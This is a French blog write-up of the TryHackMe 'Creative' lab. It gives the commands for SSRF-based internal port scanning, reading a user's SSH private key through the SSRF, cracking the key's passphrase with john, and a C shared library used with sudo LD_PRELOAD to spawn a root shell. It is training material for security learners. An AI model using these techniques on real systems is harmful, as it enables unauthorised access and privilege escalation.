<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Creative</title>
<meta name=description content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux Platforme: TryHackMe Lien: Creative Niveau: Facile OS: Linux Ce défi commence par un site web statique …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/fr/posts/thm-creative/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Creative"><meta property="og:description" content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux Platforme: TryHackMe Lien: Creative Niveau: Facile OS: Linux Ce défi commence par un site web statique …"><meta property="og:image" content="https://scorpiosec.com/images/THM-Creative/Creative.svg"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-Creative/Creative.svg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Creative"><meta name=twitter:description content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux Platforme: TryHackMe Lien: Creative Niveau: Facile OS: Linux Ce défi commence par un site web statique …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/thm-creative/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/thm-creative/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-Creative/Creative.svg"><link rel=canonical href=https://scorpiosec.com/fr/posts/thm-creative/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/thm-creative/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Creative</h1><small role=doc-subtitle></small><p class=post-date>4 min read |
<span class=post-date>17 Avril 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/r/room/creative>Creative</a></li><li>Level: Easy</li><li>OS: Linux</li></ul><hr><ul><li>Platforme: TryHackMe</li><li>Lien: <a href=https://tryhackme.com/r/room/creative>Creative</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>Ce défi commence par un site web statique qui n&rsquo;est pas exploitable. L&rsquo;énumération des sous-domaines permet de découvrir une application de test d&rsquo;URL vulnérable au SSRF. Cependant, l&rsquo;exploitation complète n&rsquo;est possible qu&rsquo;après la découverte d&rsquo;un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d&rsquo;une clé privée SSH. Mais cela ne suffit pas pour établir un point d&rsquo;ancrage. Une fois la clé SSH obtenue, le hash est craqué, donnant accès au système cible. Enfin, une élévation de privilèges est réalisée en exploitant la variable d&rsquo;environnement <code>LD_PRELOAD</code>.</p><p>Adresse IP cible - <code>10.10.119.61</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Creative 10.10.119.61
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-12 20:52 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.119.61
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.27s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://creative.thm
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 40.97 seconds
</span></span></code></pre></div><p>Nous avons deux ports ouverts, 22 (SSH) et 80 (Nginx). Nous sommes redirigés vers <code>http://creative.thm</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.119.61 creative.thm&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Le site web semble plutôt simple, sans aucun élément exploitable.</p><p>L&rsquo;énumération des répertoires et l&rsquo;examen du code source ne donnent rien.</p><p>En utilisant ffuf pour l&rsquo;énumération des sous-domaines, nous trouvons <code>beta</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fc 404 -t 100 -u http://creative.thm -H &#34;Host: FUZZ.creative.thm&#34; -ic -fs 178
</code></pre><p><img src=/images/THM-Creative/beta-subdomain.png alt="Beta subdomain found"></p><p>Après l&rsquo;avoir ajouté au fichier <code>/etc/hosts</code>, nous le visitons et il s&rsquo;avère être un testeur d&rsquo;URL.</p><p><img src=/images/THM-Creative/beta-url-tester.png alt="URL tester website"></p><p>En soumettant <code>http://127.0.0.1:80</code>, on retrouve le contenu de la page principale sans le style, ce qui fait penser à SSRF.</p><p><img src=/images/THM-Creative/url-test.png alt="URL tester SSRF 1"></p><p>Une tentative avec l&rsquo;url <code>http://creative.thm/etc/passwd</code> ne fonctionne pas et renvoie <code>Dead</code>.</p><p><img src=/images/THM-Creative/file-read-fail.png alt="File read attempt failed"></p><h3 id=balayage-des-ports-internes-via-ssrf>Balayage des ports internes via SSRF</h3><p>Essayons de découvrir les ports internes ouverts sur la cible.</p><pre tabindex=0><code>ffuf -u &#39;http://beta.creative.thm/&#39; -d &#34;url=http://127.0.0.1:FUZZ/&#34; -w &lt;(seq 1 65535) -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -mc all -t 100 -fs 13
</code></pre><p><img src=/images/THM-Creative/ffuf-cmd.png alt="Internal ports fuzzing"></p><p>Le port <code>1337</code> est découvert, en soumettant <code>http://127.0.0.1:1337/</code> nous pouvons lister les répertoires sur le serveur.</p><p><img src=/images/THM-Creative/server-directories.png alt="Directories on the server"></p><p>Avec Burp, nous explorons le système de fichiers et examinons ce que nous pouvons y trouver. Allons dans <code>/home</code>.</p><p><img src=/images/THM-Creative/home-dir.png alt="Home directory via SSRF"></p><p>Dans <code>/home</code> nous trouvons un répertoire pour <code>saad</code>. En allant plus loin avec <code>http://127.0.0.1:1337/home/saad/</code> nous découvrons le dossier <code>.shh</code> et le drapeau de l&rsquo;utilisateur <code>user.txt</code>.</p><p>Il suffit d&rsquo;utiliser <code>http://127.0.0.1:1337/home/saad/user.txt</code> pour révéler le premier drapeau.</p><h2 id=accès-initial>Accès Initial</h2><p>En soumettant <code>http://127.0.0.1:1337/home/saad/.ssh/id_rsa</code> nous pouvons récupérer la clé SSH de l&rsquo;utilisateur.</p><p><img src=/images/THM-Creative/saad-ssh-key.png alt="saad user SSH key"></p><blockquote><p>N&rsquo;oubliez pas de configurer les permissions correctes sur la clé avec <code>chmod 600</code>.</p></blockquote><p>La tentative de connexion via SSH échoue parce que nous avons besoin de la phrase secrète de l&rsquo;utilisateur.</p><pre tabindex=0><code>ssh saad@creative.thm -i id_rsa
</code></pre><p><img src=/images/THM-Creative/ssh-fail.png alt="SSH login failed"></p><p>Nous pouvons utiliser <code>john</code> pour la trouver en convertissant la clé en un hash craquable.</p><pre tabindex=0><code>ssh2john id_rsa &gt; hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre><p><img src=/images/THM-Creative/passphrase.png alt="Hash cracking to recover passphrase"></p><p>Elle est trouvée et nous pouvons maintenant nous connecter.</p><p><img src=/images/THM-Creative/foothold.png alt="Initial foothold via SSH login"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Une des choses que nous devrions toujours vérifier est le fichier <code>.bash_history</code>. Il révèle le mot de passe du compte <code>saad</code>.</p><p><img src=/images/THM-Creative/system-password.png alt="Account password recovered"></p><p>Avec ce mot de passe, nous pouvons lancer <code>sudo -l</code>. L&rsquo;utilisateur est capable de lancer <code>/usr/bin/ping</code> en tant que root.</p><p><img src=/images/THM-Creative/sudo-l.png alt="Sudo -l command"></p><p>Il n&rsquo;y a pas grand chose à faire avec <code>ping</code>. Nous pourrions essayer de remplacer le binaire par un binaire malveillant si nous avions les droits d&rsquo;écriture sur <code>/usr/bin/</code> mais ce n&rsquo;est pas le cas, tous les fichiers appartiennent à root.</p><p><img src=/images/THM-Creative/ping-binary.png alt="Ping binary permissions"></p><p>Notre prochaine piste est la variable d&rsquo;environnement <code>LD_PRELOAD</code>.</p><blockquote><p>La mention <code>env_keep+=LD_PRELOAD</code> dans la configuration sudo suggère que <code>saad</code> est autorisé à préserver la variable d&rsquo;environnement <code>LD_PRELOAD</code> lors de l&rsquo;exécution des commandes sudo. Cela pourrait potentiellement être utilisé pour charger des bibliothèques partagées malveillantes.</p></blockquote><p><code>LD_PRELOAD</code> est une variable d&rsquo;environnement sous Linux et d&rsquo;autres systèmes d&rsquo;exploitation de type Unix. Elle permet à l&rsquo;utilisateur de spécifier une liste de bibliothèques partagées supplémentaires à précharger avant toutes les autres lors de l&rsquo;exécution d&rsquo;un programme.</p><p>Un excellent article sur <code>Linux Privilege Escalation using LD_Preload</code> est disponible <a href=https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/>ici</a>.</p><ol><li>Nous créons un fichier <code>shell.c</code> dans <code>/tmp</code></li></ol><pre tabindex=0><code>cd /tmp
nano shell.c 
</code></pre><p>Ci-dessous le contenu de mon fichier, j&rsquo;ai modifié celui de l&rsquo;article qui me posait des problèmes lors de la compilation.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;stdio.h&gt;</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;unistd.h&gt; // Include this header for setuid() and setgid() functions</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;stdlib.h&gt;</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>void</span> <span style=color:#61afef;font-weight:700>_init</span>() 
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>unsetenv</span>(<span style=color:#98c379>&#34;LD_PRELOAD&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>setgid</span>(<span style=color:#d19a66>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>setuid</span>(<span style=color:#d19a66>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>system</span>(<span style=color:#98c379>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ol start=2><li>Nous compilons et lions <code>shell.c</code> dans une bibliothèque partagée nommée <code>shell.so</code></li></ol><pre tabindex=0><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
</code></pre><p><img src=/images/THM-Creative/shared-library.png alt="Shared library permissions"></p><ol start=3><li>Enfin, nous exécutons la commande <code>ping</code> avec la variable d&rsquo;environnement <code>LD_PRELOAD</code> fixée à <code>/tmp/shell.so</code> et nous accédons à root.</li></ol><pre tabindex=0><code>sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
</code></pre><p><img src=/images/THM-Creative/root-flag.png alt="Privilege escalation and root flag"></p><p>Ce challenge était assez simple, montrant comment une vulnérabilité peut conduire à une chaîne d&rsquo;exploitation. Il a également mis en évidence la façon dont les mauvaises configurations peuvent être utilisées à l&rsquo;avantage d&rsquo;un attaquant. En attendant le prochain, continuez à apprendre!</p></div><div class=prev-next><div class=next-post><p><a href=/fr/posts/htb-surveillance/>Suivant:
HTB: Surveillance
&#8594;</a></p><p class=next-post-date>avril 19, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumération>Enumération</a><ul><li><a href=#balayage-des-ports-internes-via-ssrf>Balayage des ports internes via SSRF</a></li></ul></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>